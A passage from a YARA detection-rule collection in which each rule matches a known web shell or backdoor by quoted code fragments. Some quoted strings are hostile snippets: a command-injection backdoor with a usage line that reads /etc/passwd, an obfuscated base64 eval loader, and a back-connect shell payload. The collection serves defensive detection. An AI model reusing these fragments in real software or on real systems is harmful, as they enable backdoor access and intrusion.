        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file uploader.php.php.txt"
        category = "INFO"
        hash = "0b53b67bb3b004a8681e1458dd1895d0"

    strings:
        $s2 = "move_uploaded_file($userfile, \"entrika.php\"); " fullword
        $s3 = "Send this file: <INPUT NAME=\"userfile\" TYPE=\"file\">" fullword
        $s4 = "<INPUT TYPE=\"hidden\" name=\"MAX_FILE_SIZE\" value=\"100000\">" fullword
    condition:
        2 of them
}
rule telnet_pl {
    meta:
        id = "45mvs6ojxUWEqYOXZys9t9"
        fingerprint = "v1_sha256_2d1abc52fc70ce664a19e49e6fa4175bc8d8785dee332d5273323479d9628a8c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file telnet.pl.txt"
        category = "INFO"
        hash = "dd9dba14383064e219e29396e242c1ec"

    strings:
        $s0 = "W A R N I N G: Private Server"
        $s2 = "$Message = q$<pre><font color=\"#669999\"> _____  _____  _____          _____   "
    condition:
        all of them
}
rule w3d_php_php {
    meta:
        id = "3aKi3K9pqsq3u7Q5ALgiLc"
        fingerprint = "v1_sha256_33f948a1ae4474daddd788df84fa8baabf4390ec242cad9a6a51dac0152d3b75"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file w3d.php.php.txt"
        category = "INFO"
        hash = "987f66b29bfb209a0b4f097f84f57c3b"

    strings:
        $s0 = "W3D Shell"
        $s1 = "By: Warpboy"
        $s2 = "No Query Executed"
    condition:
        2 of them
}
rule WebShell_cgi {
    meta:
        id = "2sFByGG9rf1nqOdT5Qz3yB"
        fingerprint = "v1_sha256_8908ced96284de6b6d5ae693ba54c49a6333bbe5780d951cbacc91b4dde027df"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file WebShell.cgi.txt"
        category = "INFO"
        hash = "bc486c2e00b5fc3e4e783557a2441e6f"

    strings:
        $s0 = "WebShell.cgi"
        $s2 = "<td><code class=\"entry-[% if entry.all_rights %]mine[% else"
    condition:
        all of them
}
rule WinX_Shell_html {
    meta:
        id = "21xqWxQD6U2tuYcyezgE6N"
        fingerprint = "v1_sha256_4248f807d66990946523ba7b92d795c2c40429182389d9bf3f4a972e246b50c6"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file WinX Shell.html.txt"
        category = "INFO"
        hash = "17ab5086aef89d4951fe9b7c7a561dda"

    strings:
        $s0 = "WinX Shell"
        $s1 = "Created by greenwood from n57"
        $s2 = "<td><font color=\\\"#990000\\\">Win Dir:</font></td>"
    condition:
        2 of them
}
rule Dx_php_php {
    meta:
        id = "5I3QsokO8AUIYBZJyDKUlw"
        fingerprint = "v1_sha256_ab43ddcf317eb4db890ca9750dc6bbc19b06b806339a67c82216df02bc2e8446"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Dx.php.php.txt"
        category = "INFO"
        hash = "9cfe372d49fe8bf2fac8e1c534153d9b"

    strings:
        $s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
        $s2 = "$DEF_PORTS=array (1=>'tcpmux (TCP Port Service Multiplexer)',2=>'Management Util"
        $s3 = "$ra44  = rand(1,99999);$sj98 = \"sh-$ra44\";$ml = \"$sd98\";$a5 = $_SERVER['HTTP"
    condition:
        1 of them
}
rule csh_php_php {
    meta:
        id = "aAKjf3kXs5E0LWV7Rv5E7"
        fingerprint = "v1_sha256_2a74e06a9fd59d7a577041b49403738904239fb011f9bfe2fb665165991b9c98"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file csh.php.php.txt"
        category = "INFO"
        hash = "194a9d3f3eac8bc56d9a7c55c016af96"

    strings:
        $s0 = ".::[c0derz]::. web-shell"
        $s1 = "http://c0derz.org.ua"
        $s2 = "vint21h@c0derz.org.ua"
        $s3 = "$name='63a9f0ea7bb98050796b649e85481845';//root"
    condition:
        1 of them
}
rule pHpINJ_php_php {
    meta:
        id = "18I7bL8kIyOG9YyNDjMcj4"
        fingerprint = "v1_sha256_5d39fd31cdaae7765267ce8a35a2fdcf86e7f0de40d4f303fb0f219c0fc04e40"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file pHpINJ.php.php.txt"
        category = "INFO"
        hash = "d7a4b0df45d34888d5a09f745e85733f"

    strings:
        $s1 = "News Remote PHP Shell Injection"
        $s3 = "Php Shell <br />" fullword
        $s4 = "<input type = \"text\" name = \"url\" value = \""
    condition:
        2 of them
}
rule sig_2008_php_php {
    meta:
        id = "58ZdoknRFSLO85N3ZCGFQc"
        fingerprint = "v1_sha256_a437dc3dc836e93c7a691f7a000c4a4ae574ba95b3a216394ba42538beb9c0f7"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file 2008.php.php.txt"
        category = "INFO"
        hash = "3e4ba470d4c38765e4b16ed930facf2c"

    strings:
        $s0 = "Codz by angel(4ngel)"
        $s1 = "Web: http://www.4ngel.net"
        $s2 = "$admin['cookielife'] = 86400;"
        $s3 = "$errmsg = 'The file you want Downloadable was nonexistent';"
    condition:
        1 of them
}
rule ak74shell_php_php {
    meta:
        id = "2jDMYP69Dw9d6XjuVHfYyN"
        fingerprint = "v1_sha256_64eb7e72679fc9ee81af6f46d0ab604357710716b93b1ddfaebc5596c968fce8"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file ak74shell.php.php.txt"
        category = "INFO"
        hash = "7f83adcb4c1111653d30c6427a94f66f"

    strings:
        $s1 = "$res .= '<td align=\"center\"><a href=\"'.$xshell.'?act=chmod&file='.$_SESSION["
        $s2 = "AK-74 Security Team Web Site: www.ak74-team.net"
        $s3 = "$xshell"
    condition:
        2 of them
}
rule Rem_View_php_php {
    meta:
        id = "3t3xTK3JFBbo6exS9dNI6Y"
        fingerprint = "v1_sha256_bcd5c86e793748ffe0ce4415ee68101e8183e1f97477b49843938d254f08695a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Rem View.php.php.txt"
        category = "INFO"
        hash = "29420106d9a81553ef0d1ca72b9934d9"

    strings:
        $s0 = "$php=\"/* line 1 */\\n\\n// \".mm(\"for example, uncomment next line\").\""
        $s2 = "<input type=submit value='\".mm(\"Delete all dir/files recursive\").\" (rm -fr)'"
        $s4 ="Welcome to phpRemoteView (RemView)"
    condition:
        1 of them
}
rule Java_Shell_js {
    meta:
        id = "7X923P0HXuw8w5jxJUpkga"
        fingerprint = "v1_sha256_f312298ac30ab57b21222a529b1566b9a66909806e4bc88120ac3992cfd3c6fb"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Java Shell.js.txt"
        category = "INFO"
        hash = "36403bc776eb12e8b7cc0eb47c8aac83"

    strings:
        $s2 = "PySystemState.initialize(System.getProperties(), null, argv);" fullword
        $s3 = "public class JythonShell extends JPanel implements Runnable {" fullword
        $s4 = "public static int DEFAULT_SCROLLBACK = 100"
    condition:
        2 of them
}
rule STNC_php_php {
    meta:
        id = "7DDIKpFspPy7cpKpHdhRoY"
        fingerprint = "v1_sha256_b4118dc45ac109bde1cafda24cc103370db57c1993690f450cff828c1633af3c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file STNC.php.php.txt"
        category = "INFO"
        hash = "2e56cfd5b5014cbbf1c1e3f082531815"

    strings:
        $s0 = "drmist.ru" fullword
        $s1 = "hidden(\"action\",\"download\").hidden_pwd().\"<center><table><tr><td width=80"
        $s2 = "STNC WebShell"
        $s3 = "http://www.security-teams.net/index.php?showtopic="
    condition:
        1 of them
}
rule aZRaiLPhp_v1_0_php {
    meta:
        id = "1K1ShEmRf8shFzryqrDQ1b"
        fingerprint = "v1_sha256_4385f294e59b644fe86d8380db4f7926924eb744ad80735b78ef778d2f7e8ae0"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file aZRaiLPhp v1.0.php.txt"
        category = "INFO"
        hash = "26b2d3943395682e36da06ed493a3715"

    strings:
        $s0 = "azrailphp"
        $s1 = "<br><center><INPUT TYPE='SUBMIT' NAME='dy' VALUE='Dosya Yolla!'></center>"
        $s3 = "<center><INPUT TYPE='submit' name='okmf' value='TAMAM'></center>"
    condition:
        2 of them
}
rule Moroccan_Spamers_Ma_EditioN_By_GhOsT_php {
    meta:
        id = "1X9rbgAoUGEcSyaS86cPXH"
        fingerprint = "v1_sha256_e755e4ea467861e5217d532b161bf4c582ff71aa1e4720dfa4b75d6e8d7629d8"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Moroccan Spamers Ma-EditioN By GhOsT.php.txt"
        category = "INFO"
        hash = "d1b7b311a7ffffebf51437d7cd97dc65"

    strings:
        $s0 = ";$sd98=\"john.barker446@gmail.com\""
        $s1 = "print \"Sending mail to $to....... \";"
        $s2 = "<td colspan=\"2\" width=\"715\" background=\"/simparts/images/cellpic1.gif\" hei"
    condition:
        1 of them
}
rule zacosmall_php {
    meta:
        id = "69T5MAmVa4va89bmIeF3sU"
        fingerprint = "v1_sha256_5a2125fc447344f8cc708503d9e4dd82f9b873e40ded497ef9e01974d08bf043"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file zacosmall.php.txt"
        category = "INFO"
        hash = "5295ee8dc2f5fd416be442548d68f7a6"

    strings:
        $s0 = "rand(1,99999);$sj98"
        $s1 = "$dump_file.='`'.$rows2[0].'`"
        $s3 = "filename=\\\"dump_{$db_dump}_${table_d"
    condition:
        2 of them
}
rule CmdAsp_asp {
    meta:
        id = "3qaXYst0JSjbh7mwiYD0rv"
        fingerprint = "v1_sha256_95dc25ecd47b43edbd7e7e36966377aa09da769aff2bc1c33a7df87989611bfa"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file CmdAsp.asp.txt"
        category = "INFO"
        hash = "64f24f09ec6efaa904e2492dffc518b9"

    strings:
        $s0 = "CmdAsp.asp"
        $s1 = "Set oFileSys = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword
        $s2 = "-- Use a poor man's pipe ... a temp file --"
        $s3 = "maceo @ dogmile.com"
    condition:
        2 of them
}
rule simple_backdoor_php {
    meta:
        id = "2OgbVoSsc1VKhirqsGtDCp"
        fingerprint = "v1_sha256_e2e98580b59727313de298fab0009704f621b1b6556220d5065118d960f7a068"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file simple-backdoor.php.txt"
        category = "INFO"
        hash = "f091d1b9274c881f8e41b2f96e6b9936"

    strings:
        $s0 = "$cmd = ($_REQUEST['cmd']);" fullword
        $s1 = "<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->"
        $s2 = "Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd" fullword
    condition:
        2 of them
}
rule mysql_shell_php {
    meta:
        id = "4yhhjtJ6QfY0OwBoaF2XXE"
        fingerprint = "v1_sha256_dbd825e1056c41efaf80c0495ba7b6cf1c88403b997ea7ac1378512a19f7ed8a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file mysql_shell.php.txt"
        category = "INFO"
        hash = "d42aec2891214cace99b3eb9f3e21a63"

    strings:
        $s0 = "SooMin Kim"
        $s1 = "smkim@popeye.snu.ac.kr"
        $s2 = "echo \"<td><a href='$PHP_SELF?action=deleteData&dbname=$dbname&tablename=$tablen"
    condition:
        1 of them
}
rule Dive_Shell_1_0___Emperor_Hacking_Team_php {
    meta:
        id = "4nPn3nNBsefDdkYOgu1MgD"
        fingerprint = "v1_sha256_bd51b625359799178ad3c8e02ba5bb5fca89e6e14769b86dd35c2b8a1049599f"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Dive Shell 1.0 - Emperor Hacking Team.php.txt"
        category = "INFO"
        hash = "1b5102bdc41a7bc439eea8f0010310a5"

    strings:
        $s0 = "Emperor Hacking TEAM"
        $s1 = "Simshell" fullword
        $s2 = "ereg('^[[:blank:]]*cd[[:blank:]]"
        $s3 = "<form name=\"shell\" action=\"<?php echo $_SERVER['PHP_SELF'] ?>\" method=\"POST"
    condition:
        2 of them
}
rule Asmodeus_v0_1_pl {
    meta:
        id = "2XFQcwDKaxsvyEhk4p7WCB"
        fingerprint = "v1_sha256_be0130c9d2a5d29e6ef8749b0058c96c2ca1ecb9823fd14a8a2c82978cf3d104"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Asmodeus v0.1.pl.txt"
        category = "INFO"
        hash = "0978b672db0657103c79505df69cb4bb"

    strings:
        $s0 = "[url=http://www.governmentsecurity.org"
        $s1 = "perl asmodeus.pl client 6666 127.0.0.1"
        $s2 = "print \"Asmodeus Perl Remote Shell"
        $s4 = "$internet_addr = inet_aton(\"$host\") or die \"ALOA:$!\\n\";" fullword
    condition:
        2 of them
}
rule backup_php_often_with_c99shell {
    meta:
        id = "xodArVQW1v1kkEoj0MtZL"
        fingerprint = "v1_sha256_e27d00ebfbac2565568b9a97552a331db91b4e9aa318febb048937f5c3a1a1ba"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file backup.php.php.txt"
        category = "INFO"
        hash = "aeee3bae226ad57baf4be8745c3f6094"

    strings:
        $s0 = "#phpMyAdmin MySQL-Dump" fullword
        $s2 = ";db_connect();header('Content-Type: application/octetstr"
        $s4 = "$data .= \"#Database: $database" fullword
    condition:
        all of them
}
rule Reader_asp {
    meta:
        id = "2p0k3bSg9pmrqEKpmpZseJ"
        fingerprint = "v1_sha256_ec0dc3b050d84e852e0c18bd00961f109d3506fa7f2e8656448bd5edd28d9305"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file Reader.asp.txt"
        category = "INFO"
        hash = "ad1a362e0a24c4475335e3e891a01731"

    strings:
        $s1 = "Mehdi & HolyDemon"
        $s2 = "www.infilak."
        $s3 = "'*T@*r@#@&mms^PdbYbVuBcAAA==^#~@%><form method=post name=inf><table width=\"75%"
    condition:
        2 of them
}
rule phpshell17_php {
    meta:
        id = "54k9lLUQ6jbV0gdksP90MS"
        fingerprint = "v1_sha256_a9306747a5c9756f393c61562ed4a601c75c3a9491ad19a7b7dbae1fbd505e9a"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file phpshell17.php.txt"
        category = "INFO"
        hash = "9a928d741d12ea08a624ee9ed5a8c39d"

    strings:
        $s0 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p>" fullword
        $s1 = "<title>[ADDITINAL TITTLE]-phpShell by:[YOURNAME]<?php echo PHPSHELL_VERSION ?></"
        $s2 = "href=\"mailto: [YOU CAN ENTER YOUR MAIL HERE]- [ADDITIONAL TEXT]</a></i>" fullword
    condition:
        1 of them
}
rule myshell_php_php {
    meta:
        id = "7T5nMLcJmTKAzftpu0wTUl"
        fingerprint = "v1_sha256_dd7b0fa637a8317986de0c2312b4b552f1110fb5a64590a9a21c854e5985fbb6"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file myshell.php.php.txt"
        category = "INFO"
        hash = "62783d1db52d05b1b6ae2403a7044490"

    strings:
        $s0 = "@chdir($work_dir) or ($shellOutput = \"MyShell: can't change directory."
        $s1 = "echo \"<font color=$linkColor><b>MyShell file editor</font> File:<font color"
        $s2 = " $fileEditInfo = \"&nbsp;&nbsp;:::::::&nbsp;&nbsp;Owner: <font color=$"
    condition:
        2 of them
}
rule SimShell_1_0___Simorgh_Security_MGZ_php {
    meta:
        id = "1QOIN9NG8rNpay3ePb8gCt"
        fingerprint = "v1_sha256_590a1572877fafcd4425a04c12cd56194f03a63b7acad93c39d4b16dc5a1902d"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file SimShell 1.0 - Simorgh Security MGZ.php.txt"
        category = "INFO"
        hash = "37cb1db26b1b0161a4bf678a6b4565bd"

    strings:
        $s0 = "Simorgh Security Magazine "
        $s1 = "Simshell.css"
        $s2 = "} elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], "
        $s3 = "www.simorgh-ev.com"
    condition:
        2 of them
}
rule jspshall_jsp {
    meta:
        id = "5hyFkvqW7wIcPixGrEBJJA"
        fingerprint = "v1_sha256_94c458d3f38ba21348b0202e2b81bbbc3859e97d64f101a9ea7ec6f036e38bc5"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file jspshall.jsp.txt"
        category = "INFO"
        hash = "efe0f6edaa512c4e1fdca4eeda77b7ee"

    strings:
        $s0 = "kj021320"
        $s1 = "case 'T':systemTools(out);break;"
        $s2 = "out.println(\"<tr><td>\"+ico(50)+f[i].getName()+\"</td><td> file"
    condition:
        2 of them
}
rule webshell_php {
    meta:
        id = "58uClzsuzJS54Dl9KMROfV"
        fingerprint = "v1_sha256_7b0f4f4afde7dcb44c9d877a72c961f3666278ce28a24ae8068cfbc32639e307"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file webshell.php.txt"
        category = "INFO"
        hash = "e425241b928e992bde43dd65180a4894"

    strings:
        $s2 = "<die(\"Couldn't Read directory, Blocked!!!\");"
        $s3 = "PHP Web Shell"
    condition:
        all of them
}
rule rootshell_php {
    meta:
        id = "3go1KT9Bc6Ezh3uxhe6raA"
        fingerprint = "v1_sha256_f836dd1825dc84212d32a034c0dde45d60ccd1eb667018abb60d671b61192666"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file rootshell.php.txt"
        category = "INFO"
        hash = "265f3319075536030e59ba2f9ef3eac6"

    strings:
        $s0 = "shells.dl.am"
        $s1 = "This server has been infected by $owner"
        $s2 = "<input type=\"submit\" value=\"Include!\" name=\"inc\"></p>"
        $s4 = "Could not write to file! (Maybe you didn't enter any text?)"
    condition:
        2 of them
}
rule connectback2_pl {
    meta:
        id = "1Yro8ugioBF1bZmE697UFY"
        fingerprint = "v1_sha256_7316c93f12dbbf6d0235601d8be88c199e37955507925222d00041d0ceaf01c7"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file connectback2.pl.txt"
        category = "INFO"
        hash = "473b7d226ea6ebaacc24504bd740822e"

    strings:
        $s0 = "#We Are: MasterKid, AleXutz, FatMan & MiKuTuL                                   "
        $s1 = "echo --==Userinfo==-- ; id;echo;echo --==Directory==-- ; pwd;echo; echo --==Shel"
        $s2 = "ConnectBack Backdoor"
    condition:
        1 of them
}
rule DefaceKeeper_0_2_php {
    meta:
        id = "3dI9d3mmNEOfdK4qsxzTwE"
        fingerprint = "v1_sha256_0ee3fed3441e9561867508e324d7a6b1808a8923513bf1c9b82f8238224c994c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file DefaceKeeper_0.2.php.txt"
        category = "INFO"
        hash = "713c54c3da3031bc614a8a55dccd7e7f"

    strings:
        $s0 = "target fi1e:<br><input type=\"text\" name=\"target\" value=\"index.php\"></br>" fullword
        $s1 = "eval(base64_decode(\"ZXZhbChiYXNlNjRfZGVjb2RlKCJhV2R1YjNKbFgzVnpaWEpmWVdKdmNuUW9"
        $s2 = "<img src=\"http://s43.radikal.ru/i101/1004/d8/ced1f6b2f5a9.png\" align=\"center"
    condition:
        1 of them
}
rule shells_PHP_wso {
    meta:
        id = "58k5fHx0cAzSnSOZNvltIW"
        fingerprint = "v1_sha256_31ef69228b66b30300006f63b1e4d6e92c2512caca4bd915d418b48564b39c47"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file wso.txt"
        category = "INFO"
        hash = "33e2891c13b78328da9062fbfcf898b6"

    strings:
        $s0 = "$back_connect_p=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbi"
        $s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=pos"
    condition:
        1 of them
}
rule backdoor1_php {
    meta:
        id = "2AUUTpECaZAK55kg9M228k"
        fingerprint = "v1_sha256_7c8840dc91c16b9fa19fee16e0159a7f13db23c96596e18da0cdab07931ce35b"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file backdoor1.php.txt"
        category = "INFO"
        hash = "e1adda1f866367f52de001257b4d6c98"

    strings:
        $s1 = "echo \"[DIR] <A HREF=\\\"\".$_SERVER['PHP_SELF'].\"?rep=\".realpath($rep.\".."
        $s2 = "class backdoor {"
        $s4 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?copy=1\\\">Copier un fichier</a> <"
    condition:
        1 of them
}
rule elmaliseker_asp {
    meta:
        id = "C5boRYcyapayTVoQewu2A"
        fingerprint = "v1_sha256_969f0f12449375a9ebbb8a68fd4b3db395927416d5cceccdb7f2c64310430880"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file elmaliseker.asp.txt"
        category = "INFO"
        hash = "b32d1730d23a660fd6aa8e60c3dc549f"

    strings:
        $s0 = "if Int((1-0+1)*Rnd+0)=0 then makeEmail=makeText(8) & \"@\" & makeText(8) & \".\""
        $s1 = "<form name=frmCMD method=post action=\"<%=gURL%>\">"
        $s2 = "dim zombie_array,special_array"
        $s3 = "http://vnhacker.org"
    condition:
        1 of them
}
rule indexer_asp {
    meta:
        id = "4TKro7ZkTifNQdiil5cvmB"
        fingerprint = "v1_sha256_0a51f15bfb4289dcb70e1e0b96d100be12901ebf26ed9c0e543eda5f4aa91f1c"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file indexer.asp.txt"
        category = "INFO"
        hash = "9ea82afb8c7070817d4cdf686abe0300"

    strings:
        $s0 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
        $s2 = "D7nD7l.km4snk`JzKnd{n_ejq;bd{KbPur#kQ8AAA==^#~@%>></td><td><input type=\"submit"
    condition:
        1 of them
}
rule DxShell_php_php {
    meta:
        id = "63clcxQummnLaHPxyO9E41"
        fingerprint = "v1_sha256_821f9295eba6119ad08349e769d1909cd7836b4e35795915e94095cf715dc6e5"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file DxShell.php.php.txt"
        category = "INFO"
        hash = "33a2b31810178f4c2e71fbdeb4899244"

    strings:
        $s0 = "print \"\\n\".'Tip: to view the file \"as is\" - open the page in <a href=\"'.Dx"
        $s2 = "print \"\\n\".'<tr><td width=100pt class=linelisting><nobr>POST (php eval)</td><"
    condition:
        1 of them
}
rule s72_Shell_v1_1_Coding_html {
    meta:
        id = "3LpHpQicSKwXeWB4SPwlpj"
        fingerprint = "v1_sha256_aef8840b72e5c435c11150007d6b3af2943126fefdc6df343d0f73755340e260"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file s72 Shell v1.1 Coding.html.txt"
        category = "INFO"
        hash = "c2e8346a5515c81797af36e7e4a3828e"

    strings:
        $s0 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><"
        $s1 = "s72 Shell v1.0 Codinf by Cr@zy_King"
        $s3 = "echo \"<p align=center>Dosya Zaten Bulunuyor</p>\""
    condition:
        1 of them
}
rule hidshell_php_php {
    meta:
        id = "vjfNvpuCZFvOMhefak1iD"
        fingerprint = "v1_sha256_b76400c320e6294b0c831fbbb8e08a9d2097fbb027065f9c4b496d4b005ba016"
        version = "1.0"
        modified = "2025-03-10"
        status = "RELEASED"
        sharing = "TLP:WHITE"
        source = "YARA-RULES-COLLECTION"
        author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
        description = "Semi-Auto-generated  - file hidshell.php.php.txt"
        category = "INFO"
        hash = "c2f3327d60884561970c63ffa09439a4"

    strings:
